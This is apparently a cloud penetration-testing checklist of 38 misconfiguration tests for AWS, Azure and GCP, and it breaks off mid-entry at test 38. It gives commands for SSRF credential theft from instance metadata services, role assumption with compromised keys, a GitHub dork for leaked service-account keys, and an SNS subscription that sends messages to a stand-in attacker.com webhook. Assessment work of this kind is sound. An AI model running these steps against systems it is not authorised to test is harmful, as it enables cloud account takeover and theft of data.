1. Test for AWS S3 Bucket Public Read Access Misconfiguration
Steps:

Identify the S3 bucket name. Common ways: look at the website's source code, JavaScript files, or API responses for URLs like https://bucketname.s3.amazonaws.com or https://s3.amazonaws.com/bucketname.
Open your terminal and run:

   curl -I https://bucketname.s3.amazonaws.com/

If that returns a 200 OK or an XML listing, the bucket is publicly readable.
Also try:

   aws s3 ls s3://bucketname --no-sign-request
The --no-sign-request flag means you are not using any credentials — you are accessing it as an anonymous user.
5. If you see a list of files, the bucket allows public read access.
6. Try downloading a file:
   aws s3 cp s3://bucketname/somefile.txt . --no-sign-request

Also try accessing https://bucketname.s3.amazonaws.com/?list-type=2 in your browser.

When it is vulnerable:
When you can list the bucket contents OR download files without providing any AWS credentials (using --no-sign-request). If you see files in the listing or get a 200 response on a file download, it is vulnerable.
Severity: HIGH — Exposes potentially sensitive data (PII, configs, secrets, backups) to anyone on the internet.

2. Test for AWS S3 Bucket Public Write Access Misconfiguration
Steps:

Identify the bucket name as above.
Try uploading a test file without credentials:

   echo "test" > test.txt
   aws s3 cp test.txt s3://bucketname/test.txt --no-sign-request

If the upload succeeds (you see an upload confirmation), the bucket allows public write.
Also try with curl:

   curl -X PUT -d "testcontent" https://bucketname.s3.amazonaws.com/test.txt

Check if the file appears accessible afterward:

   curl https://bucketname.s3.amazonaws.com/test.txt

Try deleting a file to test delete access:

   aws s3 rm s3://bucketname/test.txt --no-sign-request
When it is vulnerable:
When the aws s3 cp command succeeds without credentials, or the curl PUT returns a 200/204. If you can upload or delete files anonymously, it is vulnerable.
Severity: CRITICAL — Attackers can upload malicious files, deface hosted websites, or delete critical data.

3. Test for AWS S3 Bucket ACL Misconfiguration for Data Access
Steps:

Using authenticated AWS CLI (your own test account or provided credentials), run:

   aws s3api get-bucket-acl --bucket bucketname

Look at the Grants section in the output.
Check if any grant contains URI: http://acs.amazonaws.com/groups/global/AllUsers or URI: http://acs.amazonaws.com/groups/global/AuthenticatedUsers.
AllUsers means literally anyone on the internet.
AuthenticatedUsers means any AWS account holder (millions of people).
Also check individual object ACLs for sensitive files:

   aws s3api get-object-acl --bucket bucketname --key sensitive-file.txt

Look for AllUsers or AuthenticatedUsers in the object ACL grants as well.

When it is vulnerable:
When the ACL grants READ, WRITE, READ_ACP, WRITE_ACP, or FULL_CONTROL to AllUsers or AuthenticatedUsers. Either at the bucket level or object level is a vulnerability.
Severity: HIGH — Depending on the permission granted, attackers can read, write, or even change permissions on objects.

4. Test for AWS S3 Bucket Policy Misconfiguration for Privilege Escalation
Steps:

Retrieve the bucket policy:

   aws s3api get-bucket-policy --bucket bucketname

Look at the JSON policy output for any Effect: Allow statements with Principal: "*" (which means everyone).
Check what Action is allowed — dangerous ones include s3:*, s3:GetObject, s3:PutObject, s3:DeleteObject, s3:PutBucketPolicy.
Also check for overly broad conditions — if there are no conditions at all, it is very dangerous.
Look for policies that allow s3:PutBucketPolicy because that lets an attacker rewrite the policy and escalate privileges.
Check if the policy allows cross-account access with a wildcard principal in another account.
Use a policy analyzer:

   aws accessanalyzer list-findings
This shows findings where external access is granted.
When it is vulnerable:
When Principal is "*" and the Effect is Allow without strong conditions. When s3:PutBucketPolicy or s3:* is allowed to a broad principal. If the policy grants access to another AWS account you do not control, it may be an escalation path.
Severity: CRITICAL — Attackers can gain unauthorized access, modify policies, or fully take over the bucket.

5. Test for AWS S3 Bucket CORS Misconfiguration for Cross-Origin Access
Steps:

Get the CORS configuration:

   aws s3api get-bucket-cors --bucket bucketname

Look at the AllowedOrigins field.
If you see * as an allowed origin with AllowedMethods including GET or PUT, it is misconfigured.
Also check AllowCredentials — if it is true alongside a wildcard or broad origin, that is especially dangerous.
Manually test with curl:

   curl -H "Origin: https://evil.com" -I https://bucketname.s3.amazonaws.com/file.txt

If the response includes Access-Control-Allow-Origin: https://evil.com or Access-Control-Allow-Origin: *, the CORS is overly permissive.
Test a cross-origin PUT:

   curl -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: PUT" https://bucketname.s3.amazonaws.com/
When it is vulnerable:
When AllowedOrigins contains * or reflects your arbitrary origin back, AND useful methods (GET, PUT, DELETE) are allowed. Even GET with wildcard exposes data to malicious cross-origin scripts.
Severity: HIGH — Malicious websites can make cross-origin requests to the bucket on behalf of authenticated users.

6. Test for AWS S3 Bucket Encryption Disabled Vulnerability
Steps:

Check if default encryption is enabled on the bucket:

   aws s3api get-bucket-encryption --bucket bucketname

If the command returns an error like ServerSideEncryptionConfigurationNotFoundError, encryption is NOT enabled by default.
Also check individual object encryption:

   aws s3api head-object --bucket bucketname --key filename.txt
Look for ServerSideEncryption in the response. If it is absent, the object is stored unencrypted.
4. Check what type of encryption is used: AES256 (S3-managed keys) or aws:kms (KMS). KMS is stronger.
5. Also check if the bucket policy enforces encryption for uploads:
   aws s3api get-bucket-policy --bucket bucketname
Look for a Deny statement on s3:PutObject when s3:x-amz-server-side-encryption is absent.
When it is vulnerable:
When the get-bucket-encryption command returns an error (encryption not configured), or when uploaded objects do not have the ServerSideEncryption attribute. If there is no bucket policy denying unencrypted uploads, data can be stored in plaintext.
Severity: MEDIUM — Data at rest is unprotected. If AWS infrastructure is compromised or storage media is physically accessed, data is exposed.

7. Test for AWS S3 Bucket Logging Disabled for Audit Gap
Steps:

Check if access logging is enabled:

   aws s3api get-bucket-logging --bucket bucketname

If the response returns an empty LoggingEnabled section or nothing, logging is disabled.
Also check if AWS CloudTrail is capturing S3 data events for this bucket (this is separate from S3 access logging):

   aws cloudtrail get-event-selectors --trail-name your-trail-name

Look for DataResources that include arn:aws:s3:::bucketname/ or arn:aws:s3:::*.
If neither S3 access logging nor CloudTrail data events are enabled, there is a complete audit gap.

When it is vulnerable:
When get-bucket-logging returns no logging configuration AND CloudTrail has no data events for the bucket. All access (reads, writes, deletes) happens invisibly with no audit trail.
Severity: MEDIUM — Not directly exploitable, but enables attackers to operate without detection and makes incident response impossible.

8. Test for AWS S3 Bucket Versioning Disabled for Data Recovery Gap
Steps:

Check versioning status:

   aws s3api get-bucket-versioning --bucket bucketname

If the response shows Status: Enabled, versioning is on.
If the response is empty or shows Status: Suspended, versioning is off or was disabled.
Test the impact: upload a file, then overwrite it, then check if the original is recoverable.
Also check if MFA Delete is enabled (stronger protection):
In the same get-bucket-versioning response, look for MFADelete: Enabled. If absent, versions can be deleted without MFA.

When it is vulnerable:
When Status is not Enabled, or when it is Enabled but MFADelete is not Enabled. Without versioning, files deleted or overwritten by ransomware or mistakes cannot be recovered.
Severity: MEDIUM — Business continuity risk; ransomware can permanently destroy all data.

9. Test for AWS EC2 Metadata Service Access via SSRF (169.254.169.254)
Steps:

Find an SSRF vulnerability in the web application first (a URL parameter that fetches remote content, a webhook URL field, an image-by-URL feature, a PDF generator, etc.).
Input the metadata URL into the SSRF-vulnerable parameter:

   http://169.254.169.254/latest/meta-data/

If the application fetches this and returns data, you have confirmed SSRF reaching the metadata service.
Now try to get the IAM role credentials:

   http://169.254.169.254/latest/meta-data/iam/security-credentials/

This returns the role name. Then fetch:

   http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME

This returns AccessKeyId, SecretAccessKey, and Token — full temporary AWS credentials.
Also try IMDSv2 — if IMDSv1 is blocked, try:

   http://169.254.169.254/latest/api/token
with a PUT request and header X-aws-ec2-metadata-token-ttl-seconds: 21600. If you get a token back, IMDSv2 is in use and you need to send that token in subsequent requests.
When it is vulnerable:
When the application fetches http://169.254.169.254/ and returns any metadata content. Confirmed critical when you can retrieve IAM role credentials from .../iam/security-credentials/ROLENAME.
Severity: CRITICAL — Full AWS account takeover possible if the role has broad permissions.

10. Test for AWS IAM Role Assumption via Compromised Credentials
Steps:

You have obtained some AWS credentials (from SSRF, exposed .env file, public repo, etc.).
Configure them in your CLI:

   aws configure
Enter the AccessKeyId and SecretAccessKey.
3. Check who you are:
   aws sts get-caller-identity

List what roles you can assume:

   aws iam list-roles

Try to assume a role with higher privileges:

   aws sts assume-role --role-arn arn:aws:iam::ACCOUNTID:role/ROLENAME --role-session-name test

If successful, you get a new set of temporary credentials with that role's permissions.
Set those new credentials as environment variables and check what you can do:

   export AWS_ACCESS_KEY_ID=...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws iam list-users
When it is vulnerable:
When the compromised credentials can successfully call sts:AssumeRole on a more privileged role, especially roles with admin permissions, or cross-account roles.
Severity: CRITICAL — Full privilege escalation; attacker moves from low-privilege to admin in the AWS account.

11. Test for AWS Lambda Function Public Access Misconfiguration
Steps:

Check if a Lambda function has a resource-based policy allowing public invocation:

   aws lambda get-policy --function-name functionname

Look for Principal: "*" in the policy.
Check if the function URL is public:

   aws lambda get-function-url-config --function-name functionname

If AuthType is NONE, anyone can invoke it via the URL.
Try invoking the function directly through its URL if one exists.
Also check if the function is behind API Gateway — look for API Gateway with no authorization.
Try invoking with AWS CLI as an unauthenticated user (create a new profile with no credentials and see what error you get).

When it is vulnerable:
When AuthType is NONE on a function URL, or when the resource policy has Principal: "*" with lambda:InvokeFunction allowed. If you can invoke the function without any credentials or from an arbitrary account, it is vulnerable.
Severity: HIGH — Unauthenticated execution of business logic, potential data exposure, or use as an attack relay.

12. Test for AWS RDS Database Public Accessibility Misconfiguration
Steps:

List all RDS instances:

   aws rds describe-db-instances

Look for PubliclyAccessible: true in the output for any instance.
Also check the security group attached to the RDS instance:

   aws ec2 describe-security-groups --group-ids sg-xxxxxxxxx

Look for inbound rules that allow 0.0.0.0/0 or ::/0 on the database port (3306 for MySQL, 5432 for PostgreSQL, 1433 for MSSQL, 1521 for Oracle).
Try connecting from your IP:

   mysql -h endpoint.rds.amazonaws.com -u admin -p

Also try a port scan to confirm reachability:

   nmap -p 3306 endpoint.rds.amazonaws.com
When it is vulnerable:
When PubliclyAccessible: true AND the security group allows inbound connections from 0.0.0.0/0 on the database port. If you can actually connect to the database from the internet, it is critically vulnerable.
Severity: CRITICAL — Direct database access from the internet; if credentials are weak or default, full data breach.

13. Test for AWS CloudFront Distribution Origin Access Vulnerability
Steps:

Find the CloudFront distribution domain (e.g., abc123.cloudfront.net).
Also find the origin server (usually an S3 bucket URL or EC2/ALB endpoint).
Try to access the origin directly, bypassing CloudFront:

   curl https://originserver.com/restricted-path
If the origin has no restrictions, your request bypasses WAF rules, authentication, and other CloudFront behaviors.
4. Check if Origin Access Control (OAC) or Origin Access Identity (OAI) is configured:
   aws cloudfront get-distribution --id DISTID
Look at Origins.Items[].S3OriginConfig.OriginAccessIdentity for S3 origins.
5. If the S3 bucket allows public access directly (checked via bucket policy), anyone can bypass CloudFront.
6. Also check if the origin is a custom HTTP server that accepts requests without a Host header matching CloudFront, or without a secret header that CloudFront adds.
When it is vulnerable:
When the S3 origin is publicly accessible without OAC/OAI, or when the custom origin server does not validate that requests come from CloudFront. If you can access origin content directly, bypassing CloudFront policies, it is vulnerable.
Severity: HIGH — Bypasses WAF, rate limiting, geo-restrictions, and signed URL requirements.

14. Test for AWS API Gateway Unauthorized Access Misconfiguration
Steps:

Find API Gateway endpoints — check JavaScript files, mobile app decompilation, or Burp Suite traffic.
Try calling endpoints without any authorization header:

   curl https://apiid.execute-api.region.amazonaws.com/stage/endpoint

If you get a 200 or actual data instead of 401/403, there is no authorization.
Check if it requires an API key — try without the x-api-key header.
Check the method-level authorization in AWS console or CLI:

   aws apigateway get-method --rest-api-id apiid --resource-id resourceid --http-method GET
Look at authorizationType — if it is NONE, there is no auth.
6. Try accessing methods that should be restricted (admin functions, data deletion, etc.).
7. Also check if CORS is overly permissive (see CORS tests below).
When it is vulnerable:
When authorizationType is NONE on sensitive endpoints, or when you successfully call protected endpoints without credentials. Any 200 response to an unauthenticated call on a private API is a vulnerability.
Severity: HIGH to CRITICAL — Depends on what the API does; could be data exposure, account takeover, or system modification.

15. Test for AWS SQS Queue Public Access Misconfiguration
Steps:

Get the queue URL:

   aws sqs list-queues

Check the queue policy:

   aws sqs get-queue-attributes --queue-url QUEUEURL --attribute-names Policy

Parse the Policy JSON and look for Principal: "*" or Principal: {"AWS": "*"} with Effect: Allow.
Test sending a message without credentials:

   aws sqs send-message --queue-url QUEUEURL --message-body "test" --no-sign-request

Test receiving messages without credentials:

   aws sqs receive-message --queue-url QUEUEURL --no-sign-request

If either succeeds, the queue is publicly accessible.

When it is vulnerable:
When you can send or receive messages without credentials. Receiving messages is especially critical as it exposes data in flight between services.
Severity: HIGH — Attackers can inject malicious messages into processing pipelines or intercept sensitive data.

16. Test for AWS SNS Topic Public Access Misconfiguration
Steps:

List topics:

   aws sns list-topics

Get the topic policy:

   aws sns get-topic-attributes --topic-arn arn:aws:sns:region:account:topicname

Look in the Policy attribute for Principal: "*" with sns:Publish or sns:Subscribe allowed.
Try publishing a message without credentials:

   aws sns publish --topic-arn TOPICARN --message "test" --no-sign-request

Try subscribing an attacker-controlled endpoint:

   aws sns subscribe --topic-arn TOPICARN --protocol https --notification-endpoint https://attacker.com/webhook --no-sign-request

If subscription succeeds, all future notifications will be delivered to the attacker.

When it is vulnerable:
When you can publish or subscribe without credentials. Unauthorized subscription means the attacker receives all future messages from the topic.
Severity: HIGH — Data interception of sensitive notifications; ability to flood systems with injected messages.

17. Test for AWS DynamoDB Table Public Access Misconfiguration
Steps:

Check the resource-based policy:

   aws dynamodb describe-table --table-name tablename

Look for any associated IAM policies that grant public access.
Also check if the table is accessible via DynamoDB API without credentials (very rare but possible with misconfigured resource policies):

   aws dynamodb scan --table-name tablename --no-sign-request

Check if there is a publicly accessible endpoint (DynamoDB local or custom API wrapping it).
Review IAM policies for overly permissive access like dynamodb:* on Resource: "*" granted to Principal: "*".

When it is vulnerable:
When you can query or scan the table without AWS credentials. More commonly found when IAM policies grant dynamodb:* to AuthenticatedUsers (all AWS account holders).
Severity: CRITICAL — Direct access to all stored data; potential for mass data extraction.

18. Test for AWS ECS Task Definition Secret Exposure Vulnerability
Steps:

List task definitions:

   aws ecs list-task-definitions

Describe a task definition:

   aws ecs describe-task-definition --task-definition taskname:version

Look in the containerDefinitions section for environment variables containing secrets like passwords, API keys, connection strings, or tokens.
Specifically look for: DB_PASSWORD, API_KEY, SECRET_KEY, ACCESS_TOKEN, DATABASE_URL.
Check if secrets are stored as plaintext environment variables instead of using AWS Secrets Manager or SSM Parameter Store.
Secrets should appear as references like valueFrom: arn:aws:ssm:... NOT as value: actualpassword.
Also check CloudFormation templates and deployment configs for hardcoded values.

When it is vulnerable:
When you find environment variables with actual secret values (not valueFrom references) in the task definition. Any hardcoded password, API key, or token in the task definition is a vulnerability.
Severity: CRITICAL — Full exposure of credentials that grant access to databases, external APIs, and other services.

19. Test for AWS ECR Repository Public Access Misconfiguration
Steps:

Check if the ECR repository is public:

   aws ecr-public describe-repositories

If it appears in the public ECR registry, try pulling the image without credentials:

   docker pull public.ecr.aws/repositoryname/imagename:tag

For private repos, check the resource policy:

   aws ecr get-repository-policy --repository-name reponame

Look for Principal: "*" in the policy.
If you can pull the image, analyze it for secrets:

   docker inspect imagename
   docker history imagename

Extract the image layers and search for hardcoded secrets:

   docker save imagename | tar xv
   grep -r "password\|secret\|key\|token" .
When it is vulnerable:
When you can pull an image without credentials from a repository that should be private, or when a public repository exists that should not be. Also vulnerable if pulled images contain hardcoded secrets in their layers or environment variables.
Severity: HIGH to CRITICAL — Exposes internal application code, infrastructure details, and potentially embedded secrets.

20. Test for AWS CloudFormation Stack Template Secret Exposure
Steps:

List CloudFormation stacks:

   aws cloudformation list-stacks

Get a stack template:

   aws cloudformation get-template --stack-name stackname

Search the template for hardcoded secrets:

   aws cloudformation get-template --stack-name stackname | grep -i "password\|secret\|key\|token\|credentials"

Also look at stack parameters — parameters with NoEcho: true hide values but sometimes people forget to set this:

   aws cloudformation describe-stacks --stack-name stackname

Check the Parameters section in the stack description — values that should be masked might be visible.
Look at CloudFormation events for any parameter values logged in error messages:

   aws cloudformation describe-stack-events --stack-name stackname
When it is vulnerable:
When you find plaintext passwords, API keys, or other secrets in the template body or stack parameters. Any secret value visible in the template or stack description is a vulnerability.
Severity: CRITICAL — Exposes credentials used to provision the entire infrastructure.

☁️ AZURE TESTS

21. Test for Azure Blob Storage Public Access Misconfiguration
Steps:

Find Azure storage account names from source code, JavaScript, API responses, or Azure portal. They follow the pattern accountname.blob.core.windows.net.
Try listing containers without credentials:

   curl https://accountname.blob.core.windows.net/?comp=list

Try listing blobs in a specific container:

   curl https://accountname.blob.core.windows.net/containername?restype=container&comp=list

Try downloading a specific blob:

   curl https://accountname.blob.core.windows.net/containername/filename.txt

With Azure CLI, check the public access level:

   az storage container show --name containername --account-name accountname
Look at publicAccess — blob means blobs are public, container means listing and blobs are public, null/off means private.
6. Also check the storage account setting that controls public access at the account level:
   az storage account show --name accountname --resource-group rgname
Look for allowBlobPublicAccess.
When it is vulnerable:
When you can list containers or download blobs without a SAS token or account key. If the curl command returns XML with blob listing or file content, it is vulnerable.
Severity: HIGH — Exposes stored data including backups, documents, and application files to the public internet.

22. Test for Azure VM Metadata Service Access via SSRF
Steps:

Find an SSRF vulnerability in the target application (same as AWS SSRF — look for URL parameters, webhooks, image-by-URL, etc.).
Try accessing the Azure IMDS endpoint:

   http://169.254.169.254/metadata/instance?api-version=2021-02-01
with the header Metadata: true.
3. The tricky part: you need to send the Metadata: true header. Test if the SSRF vulnerability allows custom headers.
4. If the application uses a proxy or fetches URLs on your behalf, inject the header through the application mechanism.
5. A successful request returns VM instance information including subscription ID, resource group, VM name, and location.
6. Then try to get the access token:
   http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
with Metadata: true.
When it is vulnerable:
When the SSRF causes the application to reach 169.254.169.254 and you receive metadata in the response, especially the access_token from the identity endpoint.
Severity: CRITICAL — Full Azure subscription compromise if the VM has Managed Identity with broad permissions.

23. Test for Azure Managed Identity Token Extraction via SSRF
Steps:

Confirm the VM or App Service has a Managed Identity assigned.
Use SSRF to reach the token endpoint:
For VM: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
For App Service: http://169.254.169.254/msi/token?api-version=2019-08-01&resource=https://management.azure.com/
Also try the App Service environment variable endpoint: ${IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01 with the header from ${IDENTITY_HEADER}.
If you get an access_token, decode it at jwt.io to see what permissions the identity has.
Test the token against Azure Resource Manager:

   curl -H "Authorization: Bearer ACCESS_TOKEN" https://management.azure.com/subscriptions?api-version=2020-01-01

Also try using the token against other resources like Key Vault, Storage, etc.

When it is vulnerable:
When you extract a valid access_token via SSRF and can use it to call Azure management APIs. Even read access to the subscription is a vulnerability.
Severity: CRITICAL — Depending on Managed Identity permissions, full Azure subscription takeover is possible.

24. Test for Azure Key Vault Access Policy Misconfiguration
Steps:

Check the Key Vault access policies:

   az keyvault show --name vaultname

Look at properties.accessPolicies for each entry.
Check what permissions each identity has: get, list, set, delete, backup, restore, purge on secrets, keys, and certificates.
Look for overly broad permissions — All or combinations that allow listing and reading all secrets.
Also check if the Key Vault has public network access enabled:

   az keyvault show --name vaultname --query "properties.networkAcls"

If defaultAction is Allow and there are no IP restrictions, the vault is accessible from anywhere (with valid credentials).
Using extracted credentials, try listing secrets:

   az keyvault secret list --vault-name vaultname
   az keyvault secret show --vault-name vaultname --name secretname
When it is vulnerable:
When an identity (especially a Managed Identity or service principal) has list+get permissions on secrets with no network restrictions, or when any identity has All permissions without justification. If you can list and retrieve secrets from the vault, it is vulnerable.
Severity: CRITICAL — All secrets, keys, and certificates stored in the vault are exposed.

25. Test for Azure App Service Authentication Bypass Vulnerability
Steps:

Check if Azure App Service Authentication (Easy Auth) is enabled on the app:

   az webapp auth show --name appname --resource-group rgname

Look at enabled — if false, there is no platform-level auth.
Even if enabled, check the unauthenticatedClientAction — if it is AllowAnonymous, unauthenticated users can still access the app.
Try accessing the app directly without any session cookie or token.
Check if there are paths that bypass authentication:

   curl https://appname.azurewebsites.net/.auth/login/aad
   curl https://appname.azurewebsites.net/api/endpoint

Look for /api routes, static files, or admin paths that might not be protected by Easy Auth.
Try the X-MS-TOKEN-AAD-ACCESS-TOKEN header bypass — sometimes apps trust this header from internal calls.

When it is vulnerable:
When enabled is false, or unauthenticatedClientAction is AllowAnonymous when it should not be, or when specific paths return data without any authentication.
Severity: HIGH — Bypasses access control entirely; unauthenticated access to the application.

26. Test for Azure Function App Public Access Misconfiguration
Steps:

Find the Function App URL from source code or Azure portal.
Check the auth level of the function:

   az functionapp function show --name funcappname --resource-group rgname --function-name funcname

Look at config.bindings[].authLevel — levels are anonymous, function, or admin.
If anonymous, the function can be called without any key.
Try calling the function directly:

   curl https://funcappname.azurewebsites.net/api/funcname

If you get a 200 or actual response (not 401), it is publicly accessible.
Also check the host-level access keys — if function level, the key must be in the URL as ?code=KEY or the header x-functions-key: KEY. Try calling without the code to confirm it is enforced.

When it is vulnerable:
When authLevel is anonymous on sensitive functions, or when function/admin key-protected functions return data without a valid key.
Severity: HIGH — Unauthenticated execution of serverless functions; may expose data or allow unauthorized operations.

27. Test for Azure SQL Database Public Endpoint Exposure
Steps:

Check if the Azure SQL server has a public endpoint:

   az sql server show --name servername --resource-group rgname
Look at publicNetworkAccess — if Enabled, the server has a public endpoint.
2. Check the firewall rules:
   az sql server firewall-rule list --server servername --resource-group rgname

Look for rules with startIpAddress: 0.0.0.0 and endIpAddress: 255.255.255.255 — this allows connections from ANY IP.
Also look for Allow Azure services being enabled, which allows all Azure services to connect.
Try connecting from your IP:

   sqlcmd -S servername.database.windows.net -U username -P password -d databasename

Run a port scan to confirm reachability:

   nmap -p 1433 servername.database.windows.net
When it is vulnerable:
When publicNetworkAccess is Enabled AND there is a firewall rule allowing 0.0.0.0-255.255.255.255 or your specific test IP. If you can connect to the database from the internet, it is critically vulnerable.
Severity: CRITICAL — Direct database access from the internet; default or weak credentials lead to full compromise.

28. Test for Azure Cosmos DB Public Access Misconfiguration
Steps:

Check Cosmos DB network settings:

   az cosmosdb show --name cosmosname --resource-group rgname

Look at publicNetworkAccess — if Enabled, it has a public endpoint.
Check if IP firewall is configured — look at ipRules in the output. If empty, all IPs are allowed.
Check if key-based authentication is disabled or if the primary key is easily accessible.
Try accessing the REST API with the primary key:

   curl -X GET https://cosmosname.documents.azure.com/dbs/ -H "Authorization: ..." -H "x-ms-date: ..." -H "x-ms-version: 2018-12-31"

Also check if the Cosmos DB account allows public access to the data plane without network restrictions.

When it is vulnerable:
When publicNetworkAccess is Enabled with no IP restrictions (ipRules is empty), and the primary key is accessible. If you can query the database from the internet with the primary key, it is vulnerable.
Severity: CRITICAL — Full access to all data in the Cosmos DB account.

29. Test for Azure Service Bus Public Access Misconfiguration
Steps:

Check the Service Bus namespace:

   az servicebus namespace show --name sbname --resource-group rgname

Look at publicNetworkAccess and network rule sets.
Check authorization rules:

   az servicebus namespace authorization-rule list --namespace-name sbname --resource-group rgname

Look for RootManageSharedAccessKey being used broadly or shared SAS policies with excessive permissions.
Try connecting with a known SAS key and see what queues and topics you can access.
Check if the connection string is exposed anywhere (environment variables, config files, source code).

When it is vulnerable:
When the namespace has no network restrictions and uses SAS keys that are broadly shared or exposed. If you can connect and send/receive messages without proper authorization, it is vulnerable.
Severity: HIGH — Unauthorized message injection or interception in enterprise messaging systems.

30. Test for Azure Event Grid Topic Public Access Vulnerability
Steps:

Check the Event Grid topic:

   az eventgrid topic show --name topicname --resource-group rgname

Look at publicNetworkAccess and the input schema type.
Try posting an event without a valid key (if public access is enabled):

   curl -X POST https://topicname.region.eventgrid.azure.net/api/events \
   -H "Content-Type: application/json" \
   -d '[{"id":"1","eventType":"test","subject":"test","dataVersion":"1.0","data":{}}]'

Check if event subscriptions can be created without authentication.
Look for webhook event subscriptions that deliver events to external endpoints — these could be hijacked.

When it is vulnerable:
When you can publish events without a valid SAS key, or when event subscriptions deliver data to unauthorized endpoints. If posting returns 200 without credentials, it is vulnerable.
Severity: HIGH — Unauthorized event injection into event-driven architectures; potential for system manipulation.

☁️ GCP TESTS

31. Test for GCP Cloud Storage Bucket Public Access Misconfiguration
Steps:

Find GCP bucket names from source code, network traffic, or Google DNS.
Try listing without credentials:

   gsutil ls gs://bucketname --no-auth-check
Or via HTTP:
   curl https://storage.googleapis.com/storage/v1/b/bucketname/o

Try downloading a file:

   curl https://storage.googleapis.com/bucketname/filename.txt

Check IAM policy on the bucket:

   gsutil iam get gs://bucketname

Look for bindings with allUsers or allAuthenticatedUsers as the member.
allUsers is completely public (no Google account needed).
allAuthenticatedUsers is any Google account holder.

When it is vulnerable:
When allUsers has roles/storage.objectViewer, roles/storage.objectAdmin, or any role granting read/write access. If you can list or download objects without any credentials, it is vulnerable.
Severity: HIGH — Public exposure of stored data; similar to AWS S3 public access.

32. Test for GCP Compute Engine Metadata Access via SSRF
Steps:

Find SSRF vulnerability in target application.
Try the GCP metadata endpoint:

   http://metadata.google.internal/computeMetadata/v1/
with header Metadata-Flavor: Google.
3. Try the IP address form as well:
   http://169.254.169.254/computeMetadata/v1/

Get the service account token:

   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
with Metadata-Flavor: Google.
5. Also get the service account email:
   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

Use the extracted token to call GCP APIs:

   curl -H "Authorization: Bearer TOKEN" https://www.googleapis.com/compute/v1/projects/projectid/zones
When it is vulnerable:
When the SSRF reaches the metadata server and returns the access_token with token_type: Bearer. Confirmed when you can use the token to call GCP APIs.
Severity: CRITICAL — Full GCP project compromise if the service account has broad permissions.

33. Test for GCP IAM Service Account Key Extraction Vulnerability
Steps:

Check if any service account keys exist:

   gcloud iam service-accounts keys list --iam-account sa@project.iam.gserviceaccount.com

Look for user-managed keys (type USER_MANAGED) — these are downloadable JSON keys.
Search for exposed JSON key files in source code, repositories, configuration files:

   grep -r '"type": "service_account"' .

Check public GitHub repositories for GCP key files:

   site:github.com "project_id" "private_key_id" filetype:json

If you find a JSON key file, try authenticating with it:

   gcloud auth activate-service-account --key-file key.json
   gcloud config set project projectid
   gcloud storage ls

Also check GCP metadata for attached service accounts that might have exported keys.

When it is vulnerable:
When you find a valid service account JSON key file that successfully authenticates and allows API calls. Any exposed key file, regardless of permissions, is a vulnerability.
Severity: CRITICAL — Persistent access to GCP resources; unlike temporary tokens, keys do not expire unless explicitly revoked.

34. Test for GCP Cloud Function Public Access Misconfiguration
Steps:

Find Cloud Function URLs from source code or GCP console.
Check the function's IAM policy:

   gcloud functions get-iam-policy functionname --region region

Look for allUsers or allAuthenticatedUsers in the bindings with roles/cloudfunctions.invoker.
Try calling the function without credentials:

   curl https://region-project.cloudfunctions.net/functionname

If you get a 200 response with function output (instead of 403), the function is publicly accessible.
Also test with various inputs to understand what the function does and what data it can access.

When it is vulnerable:
When allUsers has roles/cloudfunctions.invoker or when the function responds 200 to unauthenticated requests. If you can invoke the function without a Google identity token, it is vulnerable.
Severity: HIGH — Unauthenticated function execution; may expose data, allow system changes, or serve as an attack pivot.

35. Test for GCP Cloud Run Service Public Access Vulnerability
Steps:

Check the Cloud Run service IAM policy:

   gcloud run services get-iam-policy servicename --region region

Look for allUsers with roles/run.invoker.
If allUsers is not in the policy, the service requires authentication.
Try accessing the service URL without credentials:

   curl https://servicename-hash-region.a.run.app/

A 403 with "Your client does not have permission" means authentication is required (correct).
A 200 response means it is publicly accessible (may be intentional or not).
For testing "should it be public?" — try accessing admin or internal API endpoints even if the main page is public.

When it is vulnerable:
When allUsers has roles/run.invoker on a service that should be internal-only, or when internal API paths are accessible without authentication.
Severity: HIGH — Unauthenticated access to containerized services; depends on what the service exposes.

36. Test for GCP BigQuery Dataset Public Access Misconfiguration
Steps:

List BigQuery datasets in the project:

   bq ls projectid

Get dataset IAM policy:

   bq show --format=prettyjson projectid:datasetname

Look in the access array for entries with specialGroup: allUsers or specialGroup: allAuthenticatedUsers.
Try querying without proper credentials (using anonymous access):

   bq query --use_legacy_sql=false 'SELECT * FROM projectid.datasetname.tablename LIMIT 10'

Also check for tables with public access via the BigQuery API:

   curl https://bigquery.googleapis.com/bigquery/v2/projects/projectid/datasets/datasetname/tables/tablename/data

Check for federated queries or external data sources that might expose internal data.

When it is vulnerable:
When allUsers or allAuthenticatedUsers appears in the dataset access with READER or higher role. If you can run queries against the dataset without proper project membership, it is vulnerable.
Severity: CRITICAL — Full read (or write) access to potentially large analytical datasets containing sensitive business or customer data.

37. Test for GCP Pub/Sub Topic Public Access Misconfiguration
Steps:

Get the IAM policy of the topic:

   gcloud pubsub topics get-iam-policy topicname

Look for allUsers or allAuthenticatedUsers with roles/pubsub.publisher or roles/pubsub.subscriber.
Try publishing without credentials:

   curl -X POST -H "Content-Type: application/json" \
   https://pubsub.googleapis.com/v1/projects/projectid/topics/topicname:publish \
   -d '{"messages":[{"data":"dGVzdA=="}]}'

Try subscribing to see if you can receive messages:

   gcloud pubsub subscriptions pull projects/projectid/subscriptions/subname --no-auth
When it is vulnerable:
When allUsers has publisher or subscriber roles. If you can publish messages or pull messages without credentials, it is vulnerable.
Severity: HIGH — Message injection or interception in event-driven architectures.

38. Test for GCP Cloud SQL Public IP Exposure Vulnerability
Steps:

Check Cloud SQL instance settings:

   gcloud sql instances describe instancename

Look at settings.ipConfiguration.ipv4Enabled — if true, the instance has a public IP.
Check settings.ipConfiguration.authorizedNetworks — if empty or contains 0.0.0.0/0, all IPs are allowed.
Try connecting from your IP:

   mysql -h PUBLIC_IP -u username -p

Also run a port scan:

   nmap -p 3306,5432,1433 PUBLIC_IP

Check if SSL is enforced: look for settings.ipConfiguration.requireSsl: true. If false, connections can be unencrypted.

When it is vulnerable:
